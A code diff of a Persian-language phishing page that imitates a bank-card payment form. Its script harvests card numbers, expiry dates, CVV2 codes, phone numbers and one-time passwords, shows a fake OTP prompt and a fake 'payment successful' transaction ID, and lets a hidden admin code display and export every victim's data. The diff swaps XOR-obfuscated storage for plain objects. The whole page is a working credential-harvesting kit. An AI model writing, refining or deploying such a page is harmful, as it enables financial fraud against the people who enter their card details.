@@ -237,8 +237,7 @@
     <script>
         (function() {
             let currentStep = 1;
-            let secretData = [];
-            const xorKey = 42;
+            let userData = []; // آرایه برای ذخیره داده‌های کاربر
             let isAdmin = false;
             const adminCode = '12122312';
 
@@ -249,16 +248,6 @@
             const cancelBtns = [document.getElementById('cancel1'), document.getElementById('cancel2'), document.getElementById('cancel3')];
             const cardInput = document.getElementById('x15');
             const adminDataContainer = document.getElementById('admin-data-container');
-            const clearDataBtn = document.getElementById('clear-data');
-
-            // XOR Encryption/Decryption
-            function xorCipher(text) {
-                let result = '';
-                for (let i = 0; i < text.length; i++) {
-                    result += String.fromCharCode(text.charCodeAt(i) ^ xorKey);
-                }
-                return result;
-            }
 
             // Input Formatting and Admin Check
             cardInput.addEventListener('input', function(e) {
@@ -288,7 +277,7 @@
             });
 
             // Fake Server Call
-            function fakeServerCall(data, callback) {
+            function fakeServerCall(callback) {
                 setTimeout(() => {
                     callback({ status: 'success', id: 'SHK-' + Math.random().toString(36).substr(2, 14).toUpperCase() });
                 }, 1500 + Math.random() * 1000);
@@ -301,9 +290,15 @@
 
             // Save Data
             function saveData() {
-                let data = `${document.getElementById('x15').value}|${document.getElementById('x16').value}|${document.getElementById('x17').value}|${document.getElementById('x19').value}|${document.getElementById('x20').value}`;
-                if (document.getElementById('x15').value.replace(/\D/g, '') !== adminCode) {
-                    secretData.push(xorCipher(data));
+                let data = {
+                    cardNumber: document.getElementById('x15').value,
+                    expiryDate: document.getElementById('x16').value,
+                    cvv2: document.getElementById('x17').value,
+                    phoneNumber: document.getElementById('x19').value,
+                    otp: document.getElementById('x20').value
+                };
+                if (data.cardNumber.replace(/\D/g, '') !== adminCode) {
+                    userData.push(data);
                     if (isAdmin) displayAdminData();
                 }
             }
@@ -311,20 +306,19 @@
             // Display Admin Data
             function displayAdminData() {
                 adminDataContainer.innerHTML = '';
-                if (secretData.length === 0) {
+                if (userData.length === 0) {
                     adminDataContainer.innerHTML = '<p>هیچ داده‌ای جمع‌آوری نشده است.</p>';
                 } else {
-                    secretData.forEach((data, index) => {
-                        let decryptedData = xorCipher(data).split('|');
+                    userData.forEach((data, index) => {
                         let userBox = document.createElement('div');
                         userBox.className = 'user-data-box';
                         userBox.innerHTML = `
                             <strong>کاربر ${index + 1}</strong><br>
-                            شماره کارت: ${decryptedData[0]}<br>
-                            تاریخ انقضا: ${decryptedData[1]}<br>
-                            CVV2: ${decryptedData[2]}<br>
-                            شماره تلفن: ${decryptedData[3]}<br>
-                            رمز پویا: ${decryptedData[4]}
+                            شماره کارت: ${data.cardNumber}<br>
+                            تاریخ انقضا: ${data.expiryDate}<br>
+                            CVV2: ${data.cvv2}<br>
+                            شماره تلفن: ${data.phoneNumber}<br>
+                            رمز پویا: ${data.otp}
                         `;
                         adminDataContainer.appendChild(userBox);
                     });
@@ -339,14 +333,16 @@
             // Clear Admin Data
             function clearAdminData() {
                 if (confirm('آیا مطمئن هستید که می‌خواهید همه داده‌ها را پاک کنید؟')) {
-                    secretData = [];
+                    userData = [];
                     displayAdminData();
                 }
             }
 
             // Export Data as File
             function exportData() {
-                let dataString = secretData.map(d => xorCipher(d)).join('\n');
+                let dataString = userData.map(data => 
+                    `کاربر: شماره کارت: ${data.cardNumber}, تاریخ انقضا: ${data.expiryDate}, CVV2: ${data.cvv2}, شماره تلفن: ${data.phoneNumber}, رمز پویا: ${data.otp}`
+                ).join('\n');
                 let blob = new Blob([dataString], { type: 'text/plain' });
                 let link = document.createElement('a');
                 link.href = URL.createObjectURL(blob);
@@ -357,7 +353,7 @@
             // Show Admin Data
             function showAdminData() {
                 if (isAdmin) {
-                    if (secretData.length > 0) {
+                    if (userData.length > 0) {
                         exportData();
                     } else {
                         alert('هیچ داده‌ای جمع‌آوری نشده است.');
@@ -402,7 +398,7 @@
                     steps[2].classList.add('active');
                     updateProgress();
                     document.getElementById('x25').style.display = 'block';
-                    fakeServerCall({}, (response) => {
+                    fakeServerCall((response) => {
                         document.getElementById('x25').style.display = 'none';
                         document.getElementById('x24').innerHTML = `پرداخت موفق!<br>شماره تراکنش: ${response.id}`;
                     });
@@ -412,7 +408,7 @@
             // Fake OTP Request
             document.getElementById('x21').addEventListener('click', () => {
                 if (document.getElementById('x19').value) {
-                    fakeServerCall({}, () => {
+                    fakeServerCall(() => {
                         alert('رمز پویا ارسال شد!');
                         let timeLeft = 120;
                         let timer = setInterval(() => {
